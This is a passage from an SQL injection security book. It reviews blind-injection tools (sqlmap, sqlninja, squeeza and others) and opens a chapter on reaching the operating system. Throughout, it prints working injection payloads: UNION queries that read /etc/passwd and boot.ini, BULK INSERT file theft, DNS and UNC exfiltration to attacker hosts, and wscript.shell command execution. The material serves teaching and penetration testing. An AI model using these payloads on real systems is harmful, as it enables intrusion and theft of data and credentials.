\nRequirements  Windows (.NET Framework)  \n\nScenarios  Generic error page, controlled output  \n Generic error page, uncontrolled output  \n Completely blind, no errors  \nSupported Databases  Access  \n MySQL  \n Oracle  \n SQL Server  \nMethods  Inference time -based modified binary search  \n Inference response -based modified binary search  \n Classic errors  \nURL  http://labs.portcullis.co.uk/application/bsql -hacker/  \nBSQL Hacker is a graphical GPL tool designed to make exploitation of blind SQL injection \nvulnerabilities trivial by separating attac k templates from the injection  strings required to \nextract particular items from the database. It comes with templates for different types of blind \nSQL injection attacks against the supported databases and also stores exploits to extract interesting data f rom the databases. The tool is designed to be used by novices and experts \nalike; an Injection Wizard is provided for the former that attempts to figure out all the details of a vulnerability and for the latter full control over the exploit string is provided.  \nAt the time of writing BSQL Hacker is still in Beta and the tool is not completely stable. \nThe Injection Wizard  did not correctly derive a working exploit in most scenarios tested by \nthe author and the Automated Injection  mode did not work for Oracle o r MySQL, and only \npartially for SQL Server. Given the vicarious nature of real -world vulnerabilities the tool \nmakes a decent effort to help out the attacker, however sometimes exploitation is only \nachievable with human insight. Other minor nuisances include memory bloat and a crowded interface that has inter -dependent options in different locations, but all in all the tool does \nsupport a large number of attack techniques against several popular databases and its multi -\nthreaded model speeds up injection atta cks. \nAfter loading the tool, click File | Load  which brings up a file selection dialog containing a \nlist of template files for various databases. Each file contains a template for a specific technique, e.g. Template -Blind -ORACLE is used for a blind attack against an Oracle database. \nSelect the file matching your database; if a second dialog is loaded then enter the full URL of the vulnerable site including GET parameters and click OK . \nThe Target URL  textbox on the Dashboard  tab will be populated with the attack template \nthat was loaded from file. Edit the Target URL  such that the attack template fits the \nvulnerable page. For instance, when loading the Blind- Oracle template, the Target URL  \ntextbox contains the URL:  \nhttp://www.example.com/example.php?id=100 AND \nNVL(ASCII(SUBSTR(({INJECTION}),{POSITION},1)),0){OPERATION}{CHAR}--  \nAny strings within “{}” are “magic variables” that are replaced at runtime by BSQL Hacker. \nFor the most part we can leave these alone; instead we will change the URL from www.example.com  to the vulnerable site along with the GET parameters (for POST requests \nuse the same request string except place the parameters and their values in the Post Data  table \non the Request & Injection  tab):  \nhttp://www.victim.com/ora- nondba-exception.jsp?txt_search=MadBob’ AND  \nNVL(ASCII(SUBSTR((SELECT user from dual),{POSITION},1)),0){OPERATION}{CHAR}--  \nNotice that we replaced {INJECTION} with “select user from dual” in addition to the other \nchanges; the Oracl e injection template was flawed so it was only possible to issue specific \nqueries.  \nOnce the URL is configured, select Oracle  from the dropdown list in the toolbar ( Figure \n5.12). If the inference method is not response -based, then further  configuration can be \nperformed on the Detection  tab. Otherwise, BSQL Hacker will attempt to determine the \ndifference in responses automatically. This automated detection suffers from the same \nlimitations as Absinthe, but BSQL Hacker will also accept user -supplied signatures, unlike \nAbsinthe. \n \nFigure 5.12  Selecting BSQL Hacker Database Plugin  \nNow that all configuration tasks have been performed, it is time to verify the settings; after \nclicking on Test Injection  a dialog should display an “Injection succeed.” message. If not, \nverify that the correct database is selected in the dropdown list and ensure the exploit string correctly completes the original SQL query. Requests and responses can be reviewed in the Reque st History  pane.  \nAssuming all settings are correct, deselect the Automated Attacks  button as these attack \nstrings are flawed; in any case we are just interested in the database login. Finally, click on the Start  button which will execute the attack and pri nt the extracted data into the Status  pane of \nthe Dashboard  as shown in Figure 5.13. Although BSQL Hacker attempts to extract database \nschemas and contents automagically, this feature was lacking reliability and the tool seems best suited for specific queries.  \n \nFigure 5.13  Extracting Database Login Using BSQL Hacker  \nSQLBrute  \n\nAttackers who are comfortable with the fundamentals behind inference attacks use this \ncommand line  tool due to its lightweight nature and straightforward syntax.  \nRequirements  Python (Windows / Linux / Mac)  \nScenarios  Generic error page, controlled output  \n Generic error page, uncontrolled output  \n Completely blind, no errors  \nSupported Databases  Oracle  \n SQL Server  \nMethods  Inference time -based binary search  \n Inference response -based modified binary search  \nURL  www.gdssecurity.com/l/t.php  \nSQLBrute relies only on a Python interpreter and at 31K is tiny compared to the other tools \nexamined. This makes it ideal for focused injection scenarios or where file size is important; its thread support boosts speed. A drawback is that it uses a fixed a lphabet from which inference \ntests are drawn; if a byte in the data is not contained within the alphabet then it cannot be retrieved, which limits the tool to text- based data.  \nIn order to run the tool, you will need the full path to the vulnerable page along with any \ndata that must be submitted (either GET or POST parameters). If using the response -based \nmode then a regular expression must be supplied in the -- error argument to the tool that \nindicates when the inference question returns false, otherwise the  timing -based mode is \navailable. In the example depicted in Figure 5.14, SQLBrute has been run in response -based \nmode against a vulnerable SQL Server, and two table names have been extracted from the \ndatabase. Based on our exploring, we know that when inference question returns FALSE, the page contains “Review count:0”, but t his could also be a regular expression instead of a fixed \nstring if needed. After execution commences the tool performs a little bit of fingerprinting and starts to extract data and print it to screen.  \n \nFigure 5.14  Running SQLBrute  \nSQLBrute is best suited to experienced users who favor simplicity and un- obfuscated \noperation.  \nSqlmap \nRequirements  Python 2.6+  \nScenarios  Generic error page, controlled output  \n Generic error page, uncontrolled output  \n Completely blind, no errors  \n\nSupported Databases  Firebird  \n Microsoft Access  \n Microsoft SQL Server  \n MySQL  \n Oracle  \n PostgreSQL  \n SAP MaxDB  \n SQLite  \n Sybase  \nMethods  Inference time -based binary search  \n Inference response -based modified binary search  \n Alternative channels: ICMP  \nURL  http://sqlmap.sourceforge.net/  \nSqlmap is a very interesting tool that has seen strong growth in recent years. Where other tools \ntend to focus on exploiting SQL injection, sqlmap devotes significant effort toward automated \ndiscovery of vulnerabilities in addition to exploitation of discovered vulnerabilities. Since the \ndetection is heuristic -based, mistakes of the false positive and false negative variety are to be \nexpected. However, for a quick check sqlmap works well. \nIn our example, a vulnerable page has already been identified and we wish to exploit it with \nsqlmap. The first step is to let the tool figure out an exploit string by aiming sqlmap at a vulnerable URL along with POST data (if any):  \nsqlmap.py -u ‘http://www.victim.com/vuln.aspx’ --level 5 --technique=B --dbms=mssql --data \n“__VIEWSTATE=dDwtMTcxMDQzNTQyMDs7Pv9Sqh6lUXcMZS8N6sLvxtaDr4nF&m_search=e%25&_ctl3=Search”  \nA quick explanation on the parameters: --level  configures sqlmap to use every possible \nexploit string in its library, -- technique  limits strings to blind inference only , --dbms  informs \nsqlmap that the database is SQL Server and -- data supplies POST variables. Setting the level \nand database ensures a more accurate exploit string; sqlmap misidentifies databases when exploits work across databases.  \nWhen run, sqlmap will tes t every parameter in the POST variable (or GET variables, should \nthey be present). If you already have the vulnerable parameter’s name, then it can be supplied with - p. \nAfter the first run, sqlmap will attempt to detect the injection point and write out th e \nsuccessful exploit string to its session file. Review this file and ensure that the detected database matches your expectation, it sometimes confuses databases which could catastrophically impact the generated exploit.  \nOnce the injection point and exploi t has been identified and written to the session file, \nsubsequent invocations of sqlmap can automate data extraction. For example, to get a list of users add the --users  flag, to get a list of databases use the --dbs , --tables  for tables in a \ndatabase, --passwords  for user password hashes and, lastly, --dump  and --dump -all for \nretrieving tables content.  \nSqlmap supports both blind inference exploits as well as timing -based inference shown in \nthis chapter, as well as exploitation techniques discussed throughout this book. Run \nsqlmap -h \nfor more options.  \nSqlninja  \nWithout going through the rest of this tool’s prodigious capabilities, sqlninja does support \ncommand execution using DNS as a return channel on SQL Server installations and we concentrate on that featu re. \nRequirements  \nPerl and a number of Perl modules (Linux)  \nScenarios  Generic error page, controlled output  \n Generic error page, uncontrolled output  \n Completely blind, no errors  \nSupported Databases  SQL Server  \nMethods  Inference time -based binary search  \n Alternative channels: DNS, ICMP  \nURL  http://sqlninja.sourceforge.net/  \nAlthough sqlninja has already been covered in Chapter 4  the alternative DNS channel was \nnot. Implementation of the channel is accomplished by first uploading an executable helper program onto the vulnerable database’s OS. Once in place, the helper application is called using xp_cmdshell; it is passed a domain name (e.g. blah.attacker.com  for which the attacker’s \nIP address is an authoritative DNS server) and provided with a command to execute. The helper executes the command, captures the output, and initiates DNS lookups by prefixing the supplied domain with the output. These DNS queries will arrive at the attacker’s address and are decoded by sqlninja and displayed. Sqlninja includes a standalone DNS server component which answers queries for the purposes of eliminating  timeouts. Figures 5.15 and 5.16 show \nsqlninja uploading the DNS helper program, and then using DNS to retrieve the SQL Server’s \naccount name by running using the ‘whoami’ command. Since sqlninja relies on both \nxp_cmdshell and file creation, privileged database access is a must.  \n \nFigure 5.15  Uploading Sqlninja’s DNS Helper  \n \nFigure 5.16  Executing Sqlninja to Extract a Username Via DNS  \nSqlninja also ships with an ICMP alternative c hannel that similarly relies on an uploaded \nhelper program to create custom ICMP packets that carry returned data.  \nSqueeza  \nThe final tool examined for automating blind SQL injection exploitation, squeeza is a command line tool that supports multiple method s for extracting information from SQL Server \n\ndatabase, with particular emphasis placed on the DNS channel where a reliability layer is \nadded.  \nRequirements  Ruby  \n tcpdump for DNS channel (Linux / Mac)  \n Authoritative DNS server for any domain  \nScenarios  Generic error page, controlled output  \n Generic error page, uncontrolled output  \n Completely blind, no errors  \nSupported Databases  SQL Server  \nMethods  Inference time -based bit -by-bit \n Alternative channel: DNS  \nURL  www.sensepost.com/research/squeeza  \nSqueeza takes a slightly different approach to SQL injection in general by dividing injection \nup into data creation (e.g. command execution, file from database’s file -system, or a SQL \nquery) and data extraction (e.g. using classic errors, timing inference,  and DNS). This enables \nthe attacker to mix and match to a large degree: command execution using timing as the return channel, or file copy over DNS. We will focus solely on the DNS extraction channel combined with command execution for data generation for  brevity’s sake. Squeeza’s DNS channel is \nhandled entirely in T -SQL meaning that there is no requirement for privileged database access \n(where privileged access is available, it is used as this speeds up extraction). Obviously, when \ndata are generated via command execution then privileged access is required likewise for file \ncopying. Squeeza also makes every attempt to be reliable in the face of unpredictable UDP \nDNS packets and has a transport layer that ensures that all data arrive. It can also handle ver y \nlong fields (up to 8000 bytes) and can extract binary data.  \nSettings are stored in a configuration file for persistence and the minimum details required: \nweb server ( host), a path to the vulnerable page ( url), any GET or POST parameters \n(querystring ) and  whether the request is a GET or POST ( method ). Inside the querystring, the \nmarker X_X_X_X_X_X  is used to locate where injection strings are placed. Figure 5.17  is a \nscreenshot showing squeeza returning a directory li sting via DNS.  \n \nFigure 5.17  Squeeza Returning a Directory Listing  \n \n \n \n \n\nSummary  \nUnderstanding and exploiting blind SQL injection is what separates regular attackers from the \npros. In the face of a defense as trivial as disabling verbose error messages, most script kiddies move onto the next target. However, blind SQL injection vulnerabilities provide just as much possible ownage through a range of techniques that allow the attacker to utilize timing, \nresponses, and alternative channels such as DNS to extract the data. By asking a simple question in the shape of a SQL query that returns either TRUE or FALSE and repeati ng \nthousands of times, the keys to the database kingdom are ours.  \nBlind SQL injection vulnerabilities are often missed because they hide in the shadows. Once \ndiscovered, a range of possible exploits is at your fingertips. Know when to choose response -\nbased  exploits as opposed to timing exploits and when to haul out the heavyweight alternative \nchannel tools; this fine -grained knowledge will save you time. Given how highly prone to \nautomation most blind SQL injection vulnerabilities are, a wide variety of too ls are available to \nboth the novice and expert covering graphical as well as command line tools with a wide -\nspectrum of supported databases.  \nWith the basics of SQL injection and blind SQL injection behind us, it is time to move onto \nthe business of further  exploitation: what happens once a comfortable injection point is \nidentified and exploited? Can we move onto exploiting the underlying operating system? Find out in Chapter 6 ! \n \nSolutions fast track  \nFinding and Confirming Blind SQL Injection  \n• Invalid data returns a generic error message rather than a verbose error, so SQL injection can \nbe confirmed by inducing side -effects such as a timed delay. You can also split and balance a \nparameter; if a numeric field contains 5 th en submit 2  + 3 or 6 −  1, if a string parameters \ncontains “MadBob” then submit ‘Mad’||‘Bob’  \n• Consider the attribute of the vulnerability: can any errors be force and is any of the content \non a non- error page controllable?  \n• A single bit of information can be inferred by asking a question in SQL whether the bit is 1 \nor 0 and a number of inference techniques accomplish this.  \nUsing Time -Based Techniques  \n• Data can either be extracted through a bit -by-bit method or via a binary search method with \ndelays indicating the value. Delays are introduced either with explicit SLEEP() -type \nfunctions or through the use of long- running queries. \n• Mostly time is used as an inference method on SQL Server and Oracle; MySQL is less \nreliable and the mechanisms are more prone to failure.  \n• Time is inherently unreliable as an inference method, but we can improve that by increasing \nthe timeouts or by with other tricks.  \nUsing Response -Based Techniques  \n• Data can either be extracted through a bit -by-bit method or via a binary search method with \nresponse content indicating the value. Typically existing queries have a clause inserted that \nkeeps the query as -is or returns no results based on the inferred value.  \n• Technique can be used with great success on a wide variety of databases.  \n• In some cases it may be possible to return more than 1 bit of information per request. \nUsing Alternative Channels  \n• Out -of-band communication has the a dvantage that data can be extracted in chunks rather \nthan in bits, providing a noticeable speed improvement. \n• Most common channel is DNS, where an attacker persuades the database to perform a name \nlookup containing a domain name controlled by the attacker  prefixed by a piece of data that \nis to be extracted. When the request arrives at the DNS name server, the attacker views that data. Other channels are HTTP and SMTP.  \n• Support for alternative channels is highly database specific and the number of tools that \nsupport alternative channels is significantly lower than those that support inference.  \nAutomating Blind SQL Injection Exploitation  \n• Absinthe’s strength is its support for database mapping and retrieval through error and \nresponse -based inference exploit s against a number of popular databases, both commercial \nand Open Source. The handy GUI is a nice touch but the lack of signature support limits its \neffectiveness.  \n• BSQL Hacker is another graphical tool that uses both time - and response -based inference \ntechniques as well as classic errors to extract items from the database  in question. Although \nstill in beta and therefore unstable, the tool has promise and provides many opportunities for fiddling.  \n• SQLBrute is the tool for command line users who have a fi xed vulnerability they wish to \nexploit using either time or response -based inference.  \n• Sqlmap combines discovering with exploitation into a powerful tool that supports both time - \nand response -based inference methods, as well as an ICMP alternative channel . It has seen \nrapid growth and is actively developed.  \n• Sqlninja, among a number of features, supports a DNS -based alternative channel for remote \ncommand execution that works by first uploading a custom binary wrapper and then executing the command via the  uploaded wrapper. The wrapper captures all output from the \ncommand and initiates a sequence of DNS requests containing the encoded output. \n• Squeeza takes a different look at SQL injection, splitting data creation from data extracting. \nThis command line t ool can extract time either through time -based inference, classic errors \nor DNS. The DNS channel is performed entirely through T -SQL and thus does not require an \nuploaded binary.  \nFrequently Asked Questions  \nQ:I’m getting an error when I submit a single quot e, is this a blind SQL injection \nvulnerability?  \nA: Not necessarily. It might be, but then it might just as well be the application detecting \ninvalid input and printing an error before the quote ever touches a database. It is a first sign; after this use th e split and balance techniques or queries that introduce side -effects to confirm.  \nQ: I’ve got an Oracle vulnerability. Can I use timing as an inference technique?  \nA: Yes, the DBMS_PIPE.RECIEVE_MESSAGE function can be embedded in SQL \nstatements, and other useful functions likely exist.  \nQ: Are there tools that use HTTP or SMTP as exfiltration channels?  \nA: Pangolin supports HTTP exfiltration to a nominated web server; data are retrieved either \nfrom the server logs or by writing a simple collecting application.  SMTP requires fairly \nspecific conditions in order to be used as an exfiltration channel and tool authors probably \nhave not yet seen a need for its support. \nQ: Using DNS as an exfiltration channel means I have to get my own domain and name \nserver!  \nA: Stop being cheap! A couple of dollars a month will get you a virtual server and a domain \nwhich is all you need and once you taste the sweet, sweet nectar that is DNS -carried data then \nthose dollars appear insignificant. \n \n \n \n  \n \n  \n \n \nChapter 6  \nExploiting the operating s ystem  \nSumit Siddharth  \nSolutions in this chapter:  \n• Accessing the File System  \n• Executing Operating System Commands  \n• Consolidating Access  \nIntroduction  \nOne of the things mentioned in the introduction to Chapter 1  was th e concept of utilizing \nfunctionality within the database to access portions of the operating system. Most databases \nship with a wealth of useful functionality for database programmers, including interfaces for interacting with the database, or for extendin g the database with user -defined functionality.  \nIn some cases, such as for Microsoft SQL Server and Oracle, this functionality has provided \na rich hunting ground for security researchers looking for bugs in these two database servers. In addition, a lot of  this functionality can also be employed as exploit vectors in SQL \ninjections ranging from the useful (reading and writing files) to the fun but useless (making the database server speak).  \nIn this chapter, we will discuss how to access the file system to p erform useful tasks such as \nreading data and uploading files. We will also discuss a number of techniques for executing arbitrary commands on the underlying operating system, which could allow someone to extend his reach from the database, and conduct an a ttack with a much wider scope.  \nBefore we begin, it is a good idea to discuss why someone would be interested in going \ndown this rabbit hole at all. The ostensible answer, of course, is the universal one: because it is there. Beyond the trite sound byte, however, there are several reasons why someone would want to use SQL injection to attack the host. \nFor instance, attacking the base host may allow the attacker to extend his reach. This means \nthat a single application compromise can be extended to target oth er hosts in the vicinity of the \ndatabase server. This ability to use the target database server as the pivot host bears promise, \nespecially since the database server has traditionally resided deep within the network in what is most often a “target -rich” en vironment.  \nUsing SQL injection attacks to target the underlying host is also attractive because it \npresents an attacker with the somewhat rare opportunity to slide into a crevice where the lines between traditional, unauthenticated, and authenticated attac ks reside. Overburdened system \nadministrators and database administrators (DBAs) will often prioritize patching based on whether a vulnerability can be exploited by an anonymous user. In addition, exploits that require an authenticated user are sometimes p ut on the back burner while other, more urgent \nfires receive attention. An attacker exploiting an SQL injection bug effectively transforms his role from that of the unauthenticated anonymous user to the authenticated user being used by the application for the database connection. We will examine all of these cases both in this chapter and in Chapter 7 . \nTools & traps… \nThe Need for Elevated Privileges  \nIn Chapter 4 , we discussed the methods that a person can employ to elevate his privileges through SQL injection \nattacks. Many of the attacks that are aimed at compromising the underlying operating system require that the SQL \nuser is running with elevated privileges. S uch elevation was not necessary in the early days, when the principle of \nleast privilege was less understood and when every application connected to the back -end database with full db-\nsysadmin privileges. For this reason, most automated SQL injection toolk its provide the ability to identify the \ncurrent user’s privilege level as well as multiple methods for possibly elevating him from a standard database user \nto a database super user.  \nAccessing the file system  \nAccessing the file system of the host running the database management system (DBMS) holds several promises for the potential attacker. In some cases, this is a precursor to attacking the operating system (e.g. finding stored credentials on the machine); in  other cases, it could \nsimply be an attempt to bypass the authorization efforts of the database itself (e.g. MySQL traditionally stored its database files in ASCII text on the file system, allowing a file -read \nattack to read database contents sans the DBMS  authorization levels). \nReading Files  \nThe ability to read arbitrary files on the host running the DBMS offers interesting possibilities \nfor the imaginative attacker. The question of “what files to read?” is an old one that attackers have been asking for a long time. The answer obviously depends largely on the attacker’s \nobjectives. In some cases the goal may be theft of documents or binaries from the host, whereas in other cases the attacker may be hoping to find credentials of some sort to further his attack. Regardless of the goal, the attacker wants to be able to read both ASCII text and binary \nfiles somehow.  \nAn obvious question that naturally follows is how the attacker is able to view these files, \nassuming he is able to coerce the DBMS into reading it. Although in this chapter we will examine a few of the answers to these questions, we covered these methods extensively in Chapters 4  and 5. Simply put, the goal of this subsection is to understand how an attacker can \nview the contents of the target file system as part of an SQL query. Actually extruding the data is a different problem to be solved.  \nMySQL  \nMySQL provides the well -abused functionality of allowing a text file to be read  into the \ndatabase through its LOAD DATA INFILE and LOAD_FILE  commands. According to the \ncurrent MySQL reference manual, “The LOAD DATA INFILE statement reads rows from a text file into a table at a very high speed. The filename must be given as a literal string.”  \nLet’s examine the use of the LOAD DATA INFILE command as it is intended to be used.  \nWe’ll start by creating a simple text file called users.txt:  \ncat users.txt  \nSumit Siddharth sumit.siddharth@fakedomain.com 1  \nDafydd Stuttard mail@fakedomain.net 1  \nDave Hartley dave@fakedomain.co.uk 1  \nRodrigo Marcos rodrigo@fakedomain.com 1  \nGary Oleary- Steele garyo@fakedomain.com 1  \nErlend Oftedal erlend@fakedomain.com 1  \nMarco Slaviero marco@fakedomain.com 1  \nAlberto Revelli r00t@fakedomain.net 1  \nAlexander Kornbrust ak@ fakedomain.com 1  \nJustin Clarke justin@fakedomain.com 1  \nKevvie Fowler kevviefowler@fakedomain.com 1  \nThen we’ll run the following command within the MySQL console to create a table to house \nthe author details:  \nmysql> create table authors (fname char(50), sname char(50), email char(100), flag int);  \nQuery OK, 0 rows affected (0.01 sec)  \nWith the table ready to accept the text file, we’ll populate the table with the following \ncommand:  \nmysql> load data infile ‘/tmp/users.tx t’ into table authors fields terminated by ’’;  \nQuery OK, 11 rows affected (0.00 sec)  \nRecords: 11 Deleted: 0 Skipped: 0 Warnings: 0  \nA quick select on the authors  table reveals that the text file has been perfectly imported into \nthe database:  \nmysql> select ∗ from authors;  \n+-----------+ ---------------+ ------------------------------+ -----+  \n| fname | sname | email | flag|  \n+-----------+ ---------------+ ------------------------------+ -----+  \n| Sumit | Siddharth |  sumit.siddharth @fakedomain.com| 1 |  \n| Dafydd | Stuttard | mail@fakedomain.net | 1 |  \n| Dave | Hartley | dave@fakedomain.co.uk | 1 |  \n| Rodrigo | Marcos | rodrigo@fakedomain.com | 1 |  \n| Gary | Oleary- Steele | garyo@fakedomain.com | 1 |  \n| Erlend | Oftedal |  erlend@fakedomain.com | 1 |  \n| Marco | Slaviero | marco@fakedomain.com | 1 |  \n| Alberto | Revelli | r00t@fakedomain.net | 1 |  \n| Alexander | Kornbrust | ak@fakedomain.com | 1 |  \n| Justin | Clarke | justin@fakedomain.com | 1 |  \n| Kevvie | Fowler | kevviefowler@fakedomain.com | 1 |  \n+-----------+ ---------------+ ------------------------------+ ------+ \n11 rows in set (0.00 sec)  \nFor easier hacking fun, MySQL also provides the LOAD_FILE  function, which allows you \nto avoid first creating a table, and goes straight to delivering the results:  \nmysql> select LOAD_FILE(‘/tmp/test.txt’);  \n+--------------------------------------------------------------------------+  \n| LOAD_FILE(‘/tmp/test.txt’) |  \n+--------------------------------------------------------------------------+  \n| This is an arbitrary file residing somewhere on the filesystem  \nIt can be multi- line \nand it does not really matter how many lines are in it… |  \n+-------------------------------------------------------------------------+  \n1 row in set (0.00 sec)  \nNow, since t he focus of this book is SQL injection , it would probably make sense to observe \nthis within an injected SQL statement. To test this, consider the fictitious and vulnerable \nintranet site (shown in Figure 6.1) that allow s a user to search for customers.  \n \nFigure 6.1  Sample Vulnerable Intranet Application  \nThe site is vulnerable to injection, and since it returns output directly to your browser it is a \nprime candidate for a union statement. For purposes of illustration, this site also displays the \nactual generated SQL query as a DEBUG message. The results of  a simple search for “a” \nappear in Figure 6.2.  \n\n \nFigure 6.2  Searching for “a”  \nNow we’ll consider the LOAD_FILE  syntax we examined earlier. We’ll try to use the union  \noperator to read the world- readable /etc/passwd file, using the following code:  \n‘ union select LOAD_FILE(‘/etc/passwd’)#  \nThis returns the familiar error message  regarding the union operator requiring an even \nnumber of columns in both queries:  \nDBD::mysql::st execute failed: The used SELECT statements have a different number of columns \nat… \nBy adding a second column to the unionized query, we effectively obtain joy by submitting \nthe following:  \n‘ union select NULL,LOAD_FILE(‘/etc/passwd’)#  \nThis behaves as we had hoped, and as Figure 6.3  shows, the server returns all the users in \nthe database, along with the contents of the file we  requested.  \n\n \nFigure 6.3  Reading /etc/passwd Through the Database  \nKeep in mind that accessing the file system this way requires that the database user has File \nprivileges and that the file being read has world -readable permissions. The syntax of the \nLOAD_FILE  command necessitates that the attacker use the single- quote character (‘), which \nsometimes poses a problem due to possible malicious character filtering within the application. \nChris Anley of NGS Software pointed out in his paper “HackProofing MySQL” that MySQL’s ability to treat HEX -encoded strings as a substit ute for string literals means that the following \ntwo statements are equivalent:  \nselect ‘c:/boot.ini’  \nselect 0x633a2f626f6f742e696e69  \nYou will find more information on such encoding attacks in Chapter 7 . \nThe LOAD_FILE  function also handles binary files transparently, which means that with a \nlittle bit of finesse we can use the function to read binary files from the remote host easily:  \n\nmysql> create table foo (line blob);  \nQuery OK, 0 rows affected (0.01 sec)  \nmysql> insert into foo set line=load_file(‘/tmp/temp.bin’);  \nQuery OK, 1 row affected (0.00 sec)  \nmysql> select ∗ from foo;  \n+--------+  \n| line|  \n+--------+  \n| AA??A|  \n+--------+  \n1 row in set (0.00 sec)  \nOf course, the binary data are not viewable, making it unusable to us, but MySQL comes to \nthe rescue with its built- in HEX()  function:  \nmysql> select HEX(line) from foo;  \n+--------------+  \n| HEX(line)|  \n+--------------+  \n| 414190904112|  \n+--------------+  \n1 row in set (0.00 sec)  \nWrapping the LOAD_FILE  command in the HEX() function also works, allowing us to use \nthe vulnerable intranet application to now read binary files on the remote file system:  \n‘ union select NULL,HEX(LOAD_FILE(‘/tmp/temp.bin’))#  \nThe results of this query appear in Figure 6.4.  \n \nFigure 6.4  Reading Binary Files  \nYou can use the substring function to split this, effectively obtaining chunks of the binary \nfile at a time to overcome limitations that the application might impose.  \nLOAD_FILE()  also accepts Universal Naming Convention (UNC) paths, which allow an \nenterprising attacker to search for files on other machines, or even to  cause the MySQL server \nto connect back to his own machine:  \nmysql> select load_file(‘//172.16.125.2/temp_smb/test.txt’);  \n+----------------------------------------------- + \n| load_file(‘//172.16.125.2/temp_smb/test.txt’)|  \n+----------------------------------------------- + \n| This is a file on a server far far away..|  \n+----------------------------------------------- + \n1 row in set (0.52 sec)  \n\nThe sqlmap tool by Bernardo Damele A.G. ( http://sqlmap.sourceforge.net ) offers this \nfunctionality through the --read -file command -line option:  \npython sqlmap.py -u “term=a”http://intranet/cgi- bin/customer.pl?Submit=Submit&term=a” --\nread-file /etc/passwd  \nMicrosoft SQL Server  \nMicrosoft SQL Server is one of the flagship products of the Microsoft Security Development \nLifecycle (SDL) process, but it still has a well -deserved bad rap with regard to SQL injection \nattacks. This is due in part to its popularity among first -time develo pers (a testimony to how \nMicrosoft enables its developers) and in part to the fact that the Microsoft SQL Server allows for stacked queries. This exponentially increases the options available to a potential attacker, which can be evidenced by the repercuss ions of an injection against an SQL Server box. \nSensePost alone has built tool sets that will convert an injection point into full- blown domain \nname system (DNS) tunnels, remote file servers, and even Transmission Control Protocol (TCP) connect proxies. \nLet’s begin at the beginning, and try to use a vulnerable Web application to read a file from \nthe remote SQL server. In this case, usually the first function of an attacker who has managed to obtain system administrator privileges finesse is the BULK INSERT  statement.  \nA quick test through Microsoft’s SQL Query Analyzer (shown in Figure 6.5) demonstrates \nthe use of BULK INSERT  by way of example.  \n \n\nFigure 6.5  A BULK INSERT  Inside SQL Query Analyzer  \nThe ability of the relational database management system (RDBMS) to handle files such as \nthis, along with the ability to handle batche d or stacked queries, should make it fairly obvious \nhow an attacker can leverage this through his browser. Let’s take one more look at a simple \nsearch application written in ASP with a Microsoft SQL Server back end. Figure 6.6 shows the \nresults of a search on the application for “%.” As you should expect (by now), this returns all the users on the system.  \n \nFigure 6.6  A Sample Intranet Application (with a Microsoft SQL Server Back End)  \nOnce the attacker has determined that the sname  field is vulnerable to injection, he can \nquickly determine his running privilege level by injecting a union query to select user_name() , \nuser, or loginame : \nhttp://intranet/admin/staff.asp?sname= ’ union select NULL,NULL,NULL,loginame FROM \nmaster..sysprocesses WHERE spid = @@SPID--  \nThis results in Figure 6.7 . \n\n \nFigure 6.7  Confirming the Injection  \nWith this information he moves on, effectively replicating the commands he executed within \nthe Query Analyzer program through the browser, leaving the following odd- looking query:  \nhttp://intranet/admin/staff.asp?sname= ’; create table hacked(line varchar(8000)); bulk \ninsert hacked from ‘c:\\ boot.ini’;--  \nThis allows the attacker to run a subsequent query to obtain the results of this newly created \ntable (displayed in Figure 6.8).  \n \nFigure 6.8  Reading a File Through Microsoft SQL Server  \n\nOf course, not every application will return results in such a convenient fashion, but once \nthe bulk insert has been done, an attacker can use any of the extrusion methods covered in \nChapters 4  and 5 to extract these data from the database.  \nBy setting CODEPAGE=’RAW’  when doing a BULK INSERT  an attacker can even upload \nbinary files into SQL Server, which he can rebuild after extracting it t hrough the application. \nSensePost’s Squeeza tool automates this process through the use of its !copy  mode, enabling \nan attacker to perform the bulk insert in a temporary table in the background, and then use the communication mechanism of choice (DNS, error messages, and timing) to extract the information before rebuilding the file on his machine. You can test this by picking an arbitrary binary file on the remote machine (c: \\winnt \\system32 \\net.exe) and obtaining its MD5 hash \nvalue. Figure 6.9 shows the hash value obtained for the system’s net.exe binary.  \n \nFigure 6.9  An MD5 Hash of net.exe  \nUsing a squeeza.config file that is aimed at our target application, let’ s fetch two files: the \nremote server’s boot.ini and the binary c: \\winnt \\system32 \\net.exe. Figure 6.10 displays the \nrather terse output from Squeeza. \n\n \nFigure 6.10  Copying a Binary from the Remote Server  \nIf all went well, we should be able to read the contents of the stolen- boot.ini and compare \nthe checksum on the stolen- net.exe: \n[haroon@hydra squeeza]$ cat stolen -boot.ini  \n[boot loader]  \ntimeout=30  \ndefault=multi(0)disk(0)rdisk(0)partition(1)\\ WINNT  \n[operating systems]  \nmulti(0)disk(0)rdisk(0)partition(1)\\ WINNT=“Microsoft Windows 2000 Server” /fastdetect  \n[haroon@hydra squeeza]$ md5sum stolen- net.exe  \n8f9f01a95318fc4d5a40d4a6534fa76b stolen- net.exe  \n(You can compare the MD5 values to prove that the file transfer worked perfectly, albeit \npainfully slowly depending on the !channel  you chose.)  \n\nIn the absence of the bulk insert method, an attacker can accomplish file manipulation on \nSQL Server through the use of OLE Automation, a technique discussed in Chris Anley’s \npaper, “Advanced SQL Injection.” In Anley’s example, he first used the wscript.shell  object to \nlaunch an instance of Notepad on the remote server:  \n-- wscript.shell example (Chris Anley –chris@ngssoftware.com)  \ndeclare @o int  \nexec sp_oacreate ‘wscript.shell’, @o out  \nexec sp_oamethod @o, ‘run’, NULL, ‘notepad.exe’  \nOf course, this opens the opportunity for an attacker to use any ActiveX control, which \ncreates a wealth of attacking opportunities. The file system object provides an attacker with a \nrelatively simple method to read files in the absence of bulk insert.  Figure 6.11 shows the \n(ab)use of the Scripting.FileSystemObject  within SQL Query Analyzer.  \n \nFigure 6.11  Browsing the File System Using Scripting.FileSystemObject  \nUsing the same technique, it is then possible to get SQL Server to spawn browser instances, \nwhich adds a new twist to the chain with ever more complications and attack vectors. It is not impossible to imagine an attack in which the attacker exploits a vuln erability in a browser by \nfirst using SQL injection to force the server’s browser to surf to a malicious page.  \n\nSQL Server 2005 introduced a wealth of new “features” that are attack -worthy, and \nprobably one of the biggest is the introduction of the Microsoft Common Language Runtime \n(CLR) within SQL Server. This allows a developer to integrate .NET binaries into the database trivially, and for an enterprising attacker it opens up a wealth of opportunities. From MSDN:  \n“Microsoft SQL Server 2005 significantly enhances the database programing model by hosting the \nMicrosoft .NET Framework 2.0 Common Language Runtime (CLR) . This enables developers to \nwrite procedures, triggers, and functions in any of the CLR languages, particularly Microsoft Visual C# .NET, Microsoft Visual Basic .NET, and Microsoft Visual C++. This also allows developers to \nextend the database with new ty pes and aggregates.” ( Rathakrishnan et al .) \nWe will get into the meat of 